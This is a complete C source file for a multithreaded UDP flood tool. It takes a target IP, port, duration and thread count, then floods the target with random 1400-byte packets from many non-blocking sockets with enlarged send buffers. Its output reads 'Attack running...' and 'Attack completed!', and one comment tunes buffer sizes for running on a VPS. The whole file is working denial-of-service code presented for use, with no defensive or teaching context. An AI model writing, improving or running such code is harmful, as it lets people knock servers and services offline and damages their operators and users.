#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>

// Configuration
#define MAX_PACKET_SIZE 1400
#define BATCH_SIZE 512
#define MAX_SOCKETS_PER_THREAD 16
#define SOCKET_BUFFER_SIZE (1024 * 1024 * 50) // 50MB (reduced for VPS)

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    volatile int *running;
} AttackParams;

// Global packet template (reduces memory usage)
char packet[MAX_PACKET_SIZE];

// Function to display countdown timer
void display_countdown(int duration) {
    for (int i = duration; i >= 0; i--) {
        printf("\rAttack running... Time remaining: %02d:%02d", i / 60, i % 60);
        fflush(stdout); // Flush output to update the line
        sleep(1);
    }
    printf("\n");
}

void* udp_flood(void *arg) {
    AttackParams *params = (AttackParams*)arg;
    struct sockaddr_in dest_addr;
    int socks[MAX_SOCKETS_PER_THREAD];
    int sock_count = 0;
    time_t start = time(NULL);

    // Target setup
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &dest_addr.sin_addr);

    // Socket creation
    for (int i = 0; i < MAX_SOCKETS_PER_THREAD; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, IPPROTO_UDP);
        if (sock >= 0) {
            int buf_size = SOCKET_BUFFER_SIZE;
            setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
            socks[sock_count++] = sock;
        }
    }

    // Attack loop
    while (*params->running && (time(NULL) - start) < params->duration) {
        for (int s = 0; s < sock_count; s++) {
            sendto(socks[s], packet, MAX_PACKET_SIZE, MSG_DONTWAIT, 
                   (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        }
    }

    // Cleanup
    for (int i = 0; i < sock_count; i++) close(socks[i]);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <IP> <PORT> <DURATION> [THREADS]\n", argv[0]);
        return 1;
    }

    // Configuration
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = (argc > 4) ? atoi(argv[4]) : 4;

    // Initialize packet template
    for (int i = 0; i < MAX_PACKET_SIZE; i++) {
        packet[i] = rand() % 256;
    }

    // Resource setup
    volatile int running = 1;
    pthread_t *threads_arr = malloc(threads * sizeof(pthread_t));
    AttackParams *params = calloc(threads, sizeof(AttackParams));

    // Thread creation
    for (int i = 0; i < threads; i++) {
        params[i].target_ip = ip;
        params[i].target_port = port;
        params[i].duration = duration;
        params[i].running = &running;
        
        if (pthread_create(&threads_arr[i], NULL, udp_flood, &params[i])) {
            perror("Thread creation failed");
            running = 0;
            break;
        }
    }

    // Start countdown timer
    display_countdown(duration);

    // Stop attack
    running = 0;

    // Cleanup
    for (int i = 0; i < threads; i++) pthread_join(threads_arr[i], NULL);
    free(threads_arr);
    free(params);

    printf("Attack completed!\n");
    return 0;
}